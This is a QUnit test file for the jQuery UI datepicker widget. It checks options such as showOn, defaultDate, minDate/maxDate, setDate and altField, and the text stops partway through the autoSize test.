/*
 * datepicker_options.js
 */

(function($) {

module("datepicker: options");

test("setDefaults", function() {
	expect( 3 );
	TestHelpers.datepicker.init("#inp");
	equal($.datepicker._defaults.showOn, "focus", "Initial showOn");
	$.datepicker.setDefaults({showOn: "button"});
	equal($.datepicker._defaults.showOn, "button", "Change default showOn");
	$.datepicker.setDefaults({showOn: "focus"});
	equal($.datepicker._defaults.showOn, "focus", "Restore showOn");
});

test("option", function() {
	expect( 17 );
	var inp = TestHelpers.datepicker.init("#inp"),
	inst = $.data(inp[0], TestHelpers.datepicker.PROP_NAME);
	// Set option
	equal(inst.settings.showOn, null, "Initial setting showOn");
	equal($.datepicker._get(inst, "showOn"), "focus", "Initial instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Initial default showOn");
	inp.datepicker("option", "showOn", "button");
	equal(inst.settings.showOn, "button", "Change setting showOn");
	equal($.datepicker._get(inst, "showOn"), "button", "Change instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Retain default showOn");
	inp.datepicker("option", {showOn: "both"});
	equal(inst.settings.showOn, "both", "Change setting showOn");
	equal($.datepicker._get(inst, "showOn"), "both", "Change instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Retain default showOn");
	inp.datepicker("option", "showOn", undefined);
	equal(inst.settings.showOn, null, "Clear setting showOn");
	equal($.datepicker._get(inst, "showOn"), "focus", "Restore instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Retain default showOn");
	// Get option
	inp = TestHelpers.datepicker.init("#inp");
	equal(inp.datepicker("option", "showOn"), "focus", "Initial setting showOn");
	inp.datepicker("option", "showOn", "button");
	equal(inp.datepicker("option", "showOn"), "button", "Change instance showOn");
	inp.datepicker("option", "showOn", undefined);
	equal(inp.datepicker("option", "showOn"), "focus", "Reset instance showOn");
	deepEqual(inp.datepicker("option", "all"), {showAnim: ""}, "Get instance settings");
	deepEqual(inp.datepicker("option", "defaults"), $.datepicker._defaults,
		"Get default settings");
});

test( "disabled", function() {
	expect(8);
	var inp = TestHelpers.datepicker.init("#inp");
	ok(!inp.datepicker("isDisabled"), "Initially marked as enabled");
	ok(!inp[0].disabled, "Field initially enabled");
	inp.datepicker("option", "disabled", true);
	ok(inp.datepicker("isDisabled"), "Marked as disabled");
	ok(inp[0].disabled, "Field now disabled");
	inp.datepicker("option", "disabled", false);
	ok(!inp.datepicker("isDisabled"), "Marked as enabled");
	ok(!inp[0].disabled, "Field now enabled");
	inp.datepicker("destroy");

	inp = TestHelpers.datepicker.init("#inp", { disabled: true });
	ok(inp.datepicker("isDisabled"), "Initially marked as disabled");
	ok(inp[0].disabled, "Field initially disabled");
});

test("change", function() {
	expect( 12 );
	var inp = TestHelpers.datepicker.init("#inp"),
	inst = $.data(inp[0], TestHelpers.datepicker.PROP_NAME);
	equal(inst.settings.showOn, null, "Initial setting showOn");
	equal($.datepicker._get(inst, "showOn"), "focus", "Initial instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Initial default showOn");
	inp.datepicker("change", "showOn", "button");
	equal(inst.settings.showOn, "button", "Change setting showOn");
	equal($.datepicker._get(inst, "showOn"), "button", "Change instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Retain default showOn");
	inp.datepicker("change", {showOn: "both"});
	equal(inst.settings.showOn, "both", "Change setting showOn");
	equal($.datepicker._get(inst, "showOn"), "both", "Change instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Retain default showOn");
	inp.datepicker("change", "showOn", undefined);
	equal(inst.settings.showOn, null, "Clear setting showOn");
	equal($.datepicker._get(inst, "showOn"), "focus", "Restore instance showOn");
	equal($.datepicker._defaults.showOn, "focus", "Retain default showOn");
});

asyncTest( "invocation", function() {
	var button, image,
		isOldIE = $.ui.ie && ( !document.documentMode || document.documentMode < 9 ),
		body = $( "body" );

	expect( isOldIE ? 25 : 29 );

	function step0() {
		var input = $( "<input>" ).appendTo( "#qunit-fixture" ),
			inp = TestHelpers.datepicker.init( input ),
			dp = $( "#ui-datepicker-div" );

		button = inp.siblings( "button" );
		ok( button.length === 0, "Focus - button absent" );
		image = inp.siblings( "img" );
		ok( image.length === 0, "Focus - image absent" );

		TestHelpers.datepicker.onFocus( inp, function() {
			ok( dp.is( ":visible" ), "Focus - rendered on focus" );
			inp.simulate( "keydown", { keyCode: $.ui.keyCode.ESCAPE } );
			ok( !dp.is( ":visible" ), "Focus - hidden on exit" );
			step1();
		});
	}

	function step1() {

		var input = $( "<input>" ).appendTo( "#qunit-fixture" ),
			inp = TestHelpers.datepicker.init( input ),
			dp = $( "#ui-datepicker-div" );

		TestHelpers.datepicker.onFocus( inp, function() {
			ok( dp.is( ":visible" ), "Focus - rendered on focus" );
			body.simulate( "mousedown", {} );
			ok( !dp.is( ":visible" ), "Focus - hidden on external click" );
			inp.datepicker( "hide" ).datepicker( "destroy" );

			step2();
		});
	}

	function step2() {
		var input = $( "<input>" ).appendTo( "#qunit-fixture" ),
			inp = TestHelpers.datepicker.init( input, { showOn: "button", buttonText: "Popup" } ),
			dp = $( "#ui-datepicker-div" );

		ok( !dp.is( ":visible" ), "Button - initially hidden" );
		button = inp.siblings( "button" );
		image = inp.siblings( "img" );
		ok( button.length === 1, "Button - button present" );
		ok( image.length === 0, "Button - image absent" );
		equal( button.text(), "Popup", "Button - button text" );

		TestHelpers.datepicker.onFocus( inp, function() {
			ok( !dp.is( ":visible" ), "Button - not rendered on focus" );
			button.click();
			ok( dp.is( ":visible" ), "Button - rendered on button click" );
			button.click();
			ok( !dp.is( ":visible" ), "Button - hidden on second button click" );
			inp.datepicker( "hide" ).datepicker( "destroy" );

			step3();
		});
	}

	function step3() {
		var input = $( "<input>" ).appendTo( "#qunit-fixture" ),
			inp = TestHelpers.datepicker.init( input, {
				showOn: "button",
				buttonImageOnly: true,
				buttonImage: "images/calendar.gif",
				buttonText: "Cal"
			}),
			dp = $( "#ui-datepicker-div" );

		ok( !dp.is( ":visible" ), "Image button - initially hidden" );
		button = inp.siblings( "button" );
		ok( button.length === 0, "Image button - button absent" );
		image = inp.siblings( "img" );
		ok( image.length === 1, "Image button - image present" );
		equal( image.attr( "src" ), "images/calendar.gif", "Image button - image source" );
		equal( image.attr( "title" ), "Cal", "Image button - image text" );

		TestHelpers.datepicker.onFocus( inp, function() {
			ok( !dp.is( ":visible" ), "Image button - not rendered on focus" );
			image.click();
			ok( dp.is( ":visible" ), "Image button - rendered on image click" );
			image.click();
			ok( !dp.is( ":visible" ), "Image button - hidden on second image click" );
			inp.datepicker( "hide" ).datepicker( "destroy" );

			step4();
		});
	}

	function step4() {
		var input = $( "<input>" ).appendTo( "#qunit-fixture" ),
			inp = TestHelpers.datepicker.init( input, { showOn: "both", buttonImage: "images/calendar.gif"} ),
			dp = $( "#ui-datepicker-div" );

		ok( !dp.is( ":visible" ), "Both - initially hidden" );
		button = inp.siblings( "button" );
		ok( button.length === 1, "Both - button present" );
		image = inp.siblings( "img" );
		ok( image.length === 0, "Both - image absent" );
		image = button.children( "img" );
		ok( image.length === 1, "Both - button image present" );

		// TODO: occasionally this test flakily fails to focus in IE8 in browserstack
		if ( !isOldIE ) {
			TestHelpers.datepicker.onFocus( inp, function() {
				ok( dp.is( ":visible" ), "Both - rendered on focus" );
				body.simulate( "mousedown", {} );
				ok( !dp.is( ":visible" ), "Both - hidden on external click" );
				button.click();
				ok( dp.is( ":visible" ), "Both - rendered on button click" );
				button.click();
				ok( !dp.is( ":visible" ), "Both - hidden on second button click" );
				inp.datepicker( "hide" ).datepicker( "destroy" );

				start();
			});
		} else {
			start();
		}
	}

	step0();
});

test("otherMonths", function() {
	expect( 8 );
	var inp = TestHelpers.datepicker.init("#inp"),
		pop = $("#ui-datepicker-div");
	inp.val("06/01/2009").datepicker("show");
	equal(pop.find("tbody").text(),
		// support: IE <9, jQuery <1.8
		// In IE7/8 with jQuery <1.8, encoded spaces behave in strange ways
		$( "<span>\u00a0123456789101112131415161718192021222324252627282930\u00a0\u00a0\u00a0\u00a0</span>" ).text(),
		"Other months - none");
	ok(pop.find("td:last *").length === 0, "Other months - no content");
	inp.datepicker("hide").datepicker("option", "showOtherMonths", true).datepicker("show");
	equal(pop.find("tbody").text(), "311234567891011121314151617181920212223242526272829301234",
		"Other months - show");
	ok(pop.find("td:last span").length === 1, "Other months - span content");
	inp.datepicker("hide").datepicker("option", "selectOtherMonths", true).datepicker("show");
	equal(pop.find("tbody").text(), "311234567891011121314151617181920212223242526272829301234",
		"Other months - select");
	ok(pop.find("td:last a").length === 1, "Other months - link content");
	inp.datepicker("hide").datepicker("option", "showOtherMonths", false).datepicker("show");
	equal(pop.find("tbody").text(),
		// support: IE <9, jQuery <1.8
		// In IE7/8 with jQuery <1.8, encoded spaces behave in strange ways
		$( "<span>\u00a0123456789101112131415161718192021222324252627282930\u00a0\u00a0\u00a0\u00a0</span>" ).text(),
		"Other months - none");
	ok(pop.find("td:last *").length === 0, "Other months - no content");
});

test("defaultDate", function() {
	expect( 16 );
	var inp = TestHelpers.datepicker.init("#inp"),
		date = new Date();
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date null");

	// Numeric values
	inp.datepicker("option", {defaultDate: -2}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() - 2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date -2");

	date = new Date();
	inp.datepicker("option", {defaultDate: 3}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 3);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date 3");

	date = new Date();
	inp.datepicker("option", {defaultDate: 1 / "a"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date NaN");

	// String offset values
	inp.datepicker("option", {defaultDate: "-1d"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() - 1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date -1d");
	inp.datepicker("option", {defaultDate: "+3D"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 4);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date +3D");
	inp.datepicker("option", {defaultDate: " -2 w "}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = new Date();
	date.setDate(date.getDate() - 14);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date -2 w");
	inp.datepicker("option", {defaultDate: "+1 W"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 21);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date +1 W");
	inp.datepicker("option", {defaultDate: " -1 m "}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = TestHelpers.datepicker.addMonths(new Date(), -1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date -1 m");
	inp.datepicker("option", {defaultDate: "+2M"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = TestHelpers.datepicker.addMonths(new Date(), 2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date +2M");
	inp.datepicker("option", {defaultDate: "-2y"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = new Date();
	date.setFullYear(date.getFullYear() - 2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date -2y");
	inp.datepicker("option", {defaultDate: "+1 Y "}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setFullYear(date.getFullYear() + 3);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date +1 Y");
	inp.datepicker("option", {defaultDate: "+1M +10d"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = TestHelpers.datepicker.addMonths(new Date(), 1);
	date.setDate(date.getDate() + 10);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date +1M +10d");
	// String date values
	inp.datepicker("option", {defaultDate: "07/04/2007"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = new Date(2007, 7 - 1, 4);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date 07/04/2007");
	inp.datepicker("option", {dateFormat: "yy-mm-dd", defaultDate: "2007-04-02"}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = new Date(2007, 4 - 1, 2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date 2007-04-02");
	// Date value
	date = new Date(2007, 1 - 1, 26);
	inp.datepicker("option", {dateFormat: "mm/dd/yy", defaultDate: date}).
		datepicker("hide").val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Default date 01/26/2007");
});

test("miscellaneous", function() {
	expect( 19 );
	var curYear, longNames, shortNames, date,
		dp = $("#ui-datepicker-div"),
		inp = TestHelpers.datepicker.init("#inp");
	// Year range
	function genRange(start, offset) {
		var i = start,
			range = "";
		for (; i < start + offset; i++) {
			range += i;
		}
		return range;
	}
	curYear = new Date().getFullYear();
	inp.val("02/04/2008").datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), "2008", "Year range - read-only default");
	inp.datepicker("hide").datepicker("option", {changeYear: true}).datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), genRange(2008 - 10, 21), "Year range - changeable default");
	inp.datepicker("hide").datepicker("option", {yearRange: "c-6:c+2", changeYear: true}).datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), genRange(2008 - 6, 9), "Year range - c-6:c+2");
	inp.datepicker("hide").datepicker("option", {yearRange: "2000:2010", changeYear: true}).datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), genRange(2000, 11), "Year range - 2000:2010");
	inp.datepicker("hide").datepicker("option", {yearRange: "-5:+3", changeYear: true}).datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), genRange(curYear - 5, 9), "Year range - -5:+3");
	inp.datepicker("hide").datepicker("option", {yearRange: "2000:-5", changeYear: true}).datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), genRange(2000, curYear - 2004), "Year range - 2000:-5");
	inp.datepicker("hide").datepicker("option", {yearRange: "", changeYear: true}).datepicker("show");
	equal(dp.find(".ui-datepicker-year").text(), genRange(curYear, 1), "Year range - -6:+2");

	// Navigation as date format
	inp.datepicker("option", {showButtonPanel: true});
	equal(dp.find(".ui-datepicker-prev").text(), "Prev", "Navigation prev - default");
	equal(dp.find(".ui-datepicker-current").text(), "Today", "Navigation current - default");
	equal(dp.find(".ui-datepicker-next").text(), "Next", "Navigation next - default");
	inp.datepicker("hide").datepicker("option", {navigationAsDateFormat: true, prevText: "< M", currentText: "MM", nextText: "M >"}).
		val("02/04/2008").datepicker("show");
	longNames = $.datepicker.regional[""].monthNames;
	shortNames = $.datepicker.regional[""].monthNamesShort;
	date = new Date();
	equal(dp.find(".ui-datepicker-prev").text(), "< " + shortNames[0], "Navigation prev - as date format");
	equal(dp.find(".ui-datepicker-current").text(),
		longNames[date.getMonth()], "Navigation current - as date format");
	equal(dp.find(".ui-datepicker-next").text(),
		shortNames[2] + " >", "Navigation next - as date format");
	inp.simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN});
	equal(dp.find(".ui-datepicker-prev").text(),
		"< " + shortNames[1], "Navigation prev - as date format + pgdn");
	equal(dp.find(".ui-datepicker-current").text(),
		longNames[date.getMonth()], "Navigation current - as date format + pgdn");
	equal(dp.find(".ui-datepicker-next").text(),
		shortNames[3] + " >", "Navigation next - as date format + pgdn");
	inp.datepicker("hide").datepicker("option", {gotoCurrent: true}).
		val("02/04/2008").datepicker("show");
	equal(dp.find(".ui-datepicker-prev").text(),
		"< " + shortNames[0], "Navigation prev - as date format + goto current");
	equal(dp.find(".ui-datepicker-current").text(),
		longNames[1], "Navigation current - as date format + goto current");
	equal(dp.find(".ui-datepicker-next").text(),
		shortNames[2] + " >", "Navigation next - as date format + goto current");
});

test("minMax", function() {
	expect( 23 );
	var date,
		inp = TestHelpers.datepicker.init("#inp"),
		dp = $("#ui-datepicker-div"),
		lastYear = new Date(2007, 6 - 1, 4),
		nextYear = new Date(2009, 6 - 1, 4),
		minDate = new Date(2008, 2 - 1, 29),
		maxDate = new Date(2008, 12 - 1, 7);
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), lastYear,
		"Min/max - null, null - ctrl+pgup");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), nextYear,
		"Min/max - null, null - ctrl+pgdn");
	inp.datepicker("option", {minDate: minDate}).
		datepicker("hide").val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), minDate,
		"Min/max - 02/29/2008, null - ctrl+pgup");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), nextYear,
		"Min/max - 02/29/2008, null - ctrl+pgdn");
	inp.datepicker("option", {maxDate: maxDate}).
		datepicker("hide").val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), minDate,
		"Min/max - 02/29/2008, 12/07/2008 - ctrl+pgup");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), maxDate,
		"Min/max - 02/29/2008, 12/07/2008 - ctrl+pgdn");
	inp.datepicker("option", {minDate: null}).
		datepicker("hide").val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), lastYear,
		"Min/max - null, 12/07/2008 - ctrl+pgup");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), maxDate,
		"Min/max - null, 12/07/2008 - ctrl+pgdn");
	// Relative dates
	date = new Date();
	date.setDate(date.getDate() - 7);
	inp.datepicker("option", {minDate: "-1w", maxDate: "+1 M +10 D "}).
		datepicker("hide").val("").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date,
		"Min/max - -1w, +1 M +10 D - ctrl+pgup");
	date = TestHelpers.datepicker.addMonths(new Date(), 1);
	date.setDate(date.getDate() + 10);
	inp.val("").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date,
		"Min/max - -1w, +1 M +10 D - ctrl+pgdn");
	// With existing date
	inp = TestHelpers.datepicker.init("#inp");
	inp.val("06/04/2008").datepicker("option", {minDate: minDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 6 - 1, 4), "Min/max - setDate > min");
	inp.datepicker("option", {minDate: null}).val("01/04/2008").datepicker("option", {minDate: minDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), minDate, "Min/max - setDate < min");
	inp.datepicker("option", {minDate: null}).val("06/04/2008").datepicker("option", {maxDate: maxDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 6 - 1, 4), "Min/max - setDate < max");
	inp.datepicker("option", {maxDate: null}).val("01/04/2009").datepicker("option", {maxDate: maxDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), maxDate, "Min/max - setDate > max");
	inp.datepicker("option", {maxDate: null}).val("01/04/2008").datepicker("option", {minDate: minDate, maxDate: maxDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), minDate, "Min/max - setDate < min");
	inp.datepicker("option", {maxDate: null}).val("06/04/2008").datepicker("option", {minDate: minDate, maxDate: maxDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 6 - 1, 4), "Min/max - setDate > min, < max");
	inp.datepicker("option", {maxDate: null}).val("01/04/2009").datepicker("option", {minDate: minDate, maxDate: maxDate});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), maxDate, "Min/max - setDate > max");

	inp.datepicker("option", {yearRange: "-0:+1"}).val("01/01/" + new Date().getFullYear());
	ok(dp.find(".ui-datepicker-prev").hasClass("ui-state-disabled"), "Year Range Test - previous button disabled at 1/1/minYear");
	inp.datepicker("setDate", "12/30/" + new Date().getFullYear());
	ok(dp.find(".ui-datepicker-next").hasClass("ui-state-disabled"), "Year Range Test - next button disabled at 12/30/maxYear");

	inp.datepicker("option", {
		minDate: new Date(1900, 0, 1),
		maxDate: "-6Y",
		yearRange: "1900:-6"
	}).val( "" );
	ok(dp.find(".ui-datepicker-next").hasClass("ui-state-disabled"), "Year Range Test - next button disabled");
	ok(!dp.find(".ui-datepicker-prev").hasClass("ui-state-disabled"), "Year Range Test - prev button enabled");

	inp.datepicker("option", {
		minDate: new Date(1900, 0, 1),
		maxDate: "1/25/2007",
		yearRange: "1900:2007"
	}).val( "" );
	ok(dp.find(".ui-datepicker-next").hasClass("ui-state-disabled"), "Year Range Test - next button disabled");
	ok(!dp.find(".ui-datepicker-prev").hasClass("ui-state-disabled"), "Year Range Test - prev button enabled");
});

test("setDate", function() {
	expect( 24 );
	var inl, alt, minDate, maxDate, dateAndTimeToSet, dateAndTimeClone,
		inp = TestHelpers.datepicker.init("#inp"),
		date1 = new Date(2008, 6 - 1, 4),
		date2 = new Date();
	ok(inp.datepicker("getDate") == null, "Set date - default");
	inp.datepicker("setDate", date1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date - 2008-06-04");
	date1 = new Date();
	date1.setDate(date1.getDate() + 7);
	inp.datepicker("setDate", +7);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date - +7");
	date2.setFullYear(date2.getFullYear() + 2);
	inp.datepicker("setDate", "+2y");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date2, "Set date - +2y");
	inp.datepicker("setDate", date1, date2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date - two dates");
	inp.datepicker("setDate");
	ok(inp.datepicker("getDate") == null, "Set date - null");
	// Relative to current date
	date1 = new Date();
	date1.setDate(date1.getDate() + 7);
	inp.datepicker("setDate", "c +7");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date - c +7");
	date1.setDate(date1.getDate() + 7);
	inp.datepicker("setDate", "c+7");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date - c+7");
	date1.setDate(date1.getDate() - 21);
	inp.datepicker("setDate", "c -3 w");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date - c -3 w");
	// Inline
	inl = TestHelpers.datepicker.init("#inl");
	date1 = new Date(2008, 6 - 1, 4);
	date2 = new Date();
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date2, "Set date inline - default");
	inl.datepicker("setDate", date1);
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date1, "Set date inline - 2008-06-04");
	date1 = new Date();
	date1.setDate(date1.getDate() + 7);
	inl.datepicker("setDate", +7);
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date1, "Set date inline - +7");
	date2.setFullYear(date2.getFullYear() + 2);
	inl.datepicker("setDate", "+2y");
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date2, "Set date inline - +2y");
	inl.datepicker("setDate", date1, date2);
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date1, "Set date inline - two dates");
	inl.datepicker("setDate");
	ok(inl.datepicker("getDate") == null, "Set date inline - null");
	// Alternate field
	alt = $("#alt");
	inp.datepicker("option", {altField: "#alt", altFormat: "yy-mm-dd"});
	date1 = new Date(2008, 6 - 1, 4);
	inp.datepicker("setDate", date1);
	equal(inp.val(), "06/04/2008", "Set date alternate - 06/04/2008");
	equal(alt.val(), "2008-06-04", "Set date alternate - 2008-06-04");
	// With minimum/maximum
	inp = TestHelpers.datepicker.init("#inp");
	date1 = new Date(2008, 1 - 1, 4);
	date2 = new Date(2008, 6 - 1, 4);
	minDate = new Date(2008, 2 - 1, 29);
	maxDate = new Date(2008, 3 - 1, 28);
	inp.val("").datepicker("option", {minDate: minDate}).datepicker("setDate", date2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date2, "Set date min/max - setDate > min");
	inp.datepicker("setDate", date1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), minDate, "Set date min/max - setDate < min");
	inp.val("").datepicker("option", {maxDate: maxDate, minDate: null}).datepicker("setDate", date1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date1, "Set date min/max - setDate < max");
	inp.datepicker("setDate", date2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), maxDate, "Set date min/max - setDate > max");
	inp.val("").datepicker("option", {minDate: minDate}).datepicker("setDate", date1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), minDate, "Set date min/max - setDate < min");
	inp.datepicker("setDate", date2);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), maxDate, "Set date min/max - setDate > max");
	dateAndTimeToSet = new Date(2008, 3 - 1, 28, 1, 11, 0);
	dateAndTimeClone = new Date(2008, 3 - 1, 28, 1, 11, 0);
	inp.datepicker("setDate", dateAndTimeToSet);
	equal(dateAndTimeToSet.getTime(), dateAndTimeClone.getTime(), "Date object passed should not be changed by setDate");
});

test("altField", function() {
	expect( 10 );
	var inp = TestHelpers.datepicker.init("#inp"),
		alt = $("#alt");
	// No alternate field set
	alt.val("");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	equal(inp.val(), "06/04/2008", "Alt field - dp - enter");
	equal(alt.val(), "", "Alt field - alt not set");
	// Alternate field set
	alt.val("");
	inp.datepicker("option", {altField: "#alt", altFormat: "yy-mm-dd"}).
		val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	equal(inp.val(), "06/04/2008", "Alt field - dp - enter");
	equal(alt.val(), "2008-06-04", "Alt field - alt - enter");
	// Move from initial date
	alt.val("");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	equal(inp.val(), "07/04/2008", "Alt field - dp - pgdn");
	equal(alt.val(), "2008-07-04", "Alt field - alt - pgdn");
	// Alternate field set - closed
	alt.val("");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ESCAPE});
	equal(inp.val(), "06/04/2008", "Alt field - dp - pgdn/esc");
	equal(alt.val(), "", "Alt field - alt - pgdn/esc");
	// Clear date and alternate
	alt.val("");
	inp.val("06/04/2008").datepicker("show");
	inp.simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.END});
	equal(inp.val(), "", "Alt field - dp - ctrl+end");
	equal(alt.val(), "", "Alt field - alt - ctrl+end");
});

test("autoSize", function() {
	expect( 15 );
	var inp = TestHelpers.datepicker.init("#inp");
	equal(inp.prop("size"), 20, "Auto size - default");
	inp.datepicker("option", "autoSize", true);
	equal(inp.prop("size"), 10, "Auto size - mm/dd/yy");
	inp.datepicker("option", "dateFormat", "m/d/yy");
	equal(inp.prop("size"), 10, "Auto size - m/d/yy");
